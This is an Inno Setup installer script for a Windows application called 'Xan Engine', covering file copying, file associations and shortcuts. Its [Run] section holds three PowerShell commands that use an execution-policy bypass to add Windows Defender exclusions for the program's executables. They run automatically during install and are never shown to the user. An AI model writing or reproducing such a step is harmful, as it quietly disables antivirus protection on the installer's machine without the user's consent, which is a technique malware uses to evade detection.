; Script generated by the Inno Setup Script Wizard.
; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!

#define MyAppName "Xan Engine"
#define MyAppVersion "4.4"
#define MyAppPublisher "TechSide"
#define MyAppURL "https://github.com/techsideofficial/XanEngine"
#define MyAppExeName "Xan.exe"
#define MyAppAssocName "Xan Cache File"
#define MyAppAssocExt ".xcache"
#define MyAppAssocKey StringChange(MyAppAssocName, " ", "") + MyAppAssocExt
#define XanVersion "4.4"

[Setup]
; NOTE: The value of AppId uniquely identifies this application. Do not use the same AppId value in installers for other applications.
; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)
AppId={{B96A4906-A02E-46DD-A985-0EF71927670E}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
;AppVerName={#MyAppName} {#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}
DefaultDirName=C:\Xan
DisableDirPage=yes
ChangesAssociations=yes
DisableProgramGroupPage=yes
LicenseFile=C:\Users\wiene\OneDrive\Documents\GitHub\XanEngine\XanEngineSource\{#XanVersion}\PF{#XanVersion}\LICENSE.txt
; Uncomment the following line to run in non administrative install mode (install for current user only.)
;PrivilegesRequired=lowest
PrivilegesRequiredOverridesAllowed=dialog
OutputDir=C:\Users\wiene\OneDrive\Documents\GitHub\XanEngine\XanEngineSource\{#XanVersion}\Compiler
OutputBaseFilename=XanEngine-{#XanVersion}-win64-shipping
SetupIconFile=C:\Users\wiene\OneDrive\Documents\GitHub\XanEngine\XanEngineSource\{#XanVersion}\PF{#XanVersion}\assets\icon.ico
Compression=lzma
SolidCompression=yes
WizardStyle=modern

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked

[Files]
Source: "C:\Users\wiene\OneDrive\Documents\GitHub\XanEngine\XanEngineSource\{#XanVersion}\PF{#XanVersion}\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\wiene\OneDrive\Documents\GitHub\XanEngine\XanEngineSource\{#XanVersion}\PF{#XanVersion}\assets\*"; DestDir: "{app}\assets"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "C:\Users\wiene\OneDrive\Documents\GitHub\XanEngine\XanEngineSource\{#XanVersion}\PF{#XanVersion}\base\*"; DestDir: "{app}\base"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "C:\Users\wiene\OneDrive\Documents\GitHub\XanEngine\XanEngineSource\{#XanVersion}\PF{#XanVersion}\binaries\*"; DestDir: "{app}\binaries"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "C:\Users\wiene\OneDrive\Documents\GitHub\XanEngine\XanEngineSource\{#XanVersion}\PF{#XanVersion}\plugins\*"; DestDir: "{app}\plugins"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "C:\Users\wiene\OneDrive\Documents\GitHub\XanEngine\XanEngineSource\{#XanVersion}\PF{#XanVersion}\LICENSE.txt"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\wiene\OneDrive\Documents\GitHub\XanEngine\XanEngineSource\{#XanVersion}\PF{#XanVersion}\README.txt"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\wiene\OneDrive\Documents\GitHub\XanEngine\XanEngineSource\{#XanVersion}\PF{#XanVersion}\Xan.exe"; DestDir: "{app}"; Flags: ignoreversion
; NOTE: Don't use "Flags: ignoreversion" on any shared system files

[Registry]
Root: HKA; Subkey: "Software\Classes\{#MyAppAssocExt}\OpenWithProgids"; ValueType: string; ValueName: "{#MyAppAssocKey}"; ValueData: ""; Flags: uninsdeletevalue
Root: HKA; Subkey: "Software\Classes\{#MyAppAssocKey}"; ValueType: string; ValueName: ""; ValueData: "{#MyAppAssocName}"; Flags: uninsdeletekey
Root: HKA; Subkey: "Software\Classes\{#MyAppAssocKey}\DefaultIcon"; ValueType: string; ValueName: ""; ValueData: "{app}\{#MyAppExeName},0"
Root: HKA; Subkey: "Software\Classes\{#MyAppAssocKey}\shell\open\command"; ValueType: string; ValueName: ""; ValueData: """{app}\{#MyAppExeName}"" ""%1"""
Root: HKA; Subkey: "Software\Classes\Applications\{#MyAppExeName}\SupportedTypes"; ValueType: string; ValueName: ".myp"; ValueData: ""

[Icons]
Name: "{autoprograms}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon

[Run]
Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath 'C:\Xan\Xan.exe' -NoNewWindow"
Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath 'C:\Xan\binaries\XanRuntime.exe' -NoNewWindow"
Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath 'C:\Xan\binaries\XanLauncher.exe' -NoNewWindow"
Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
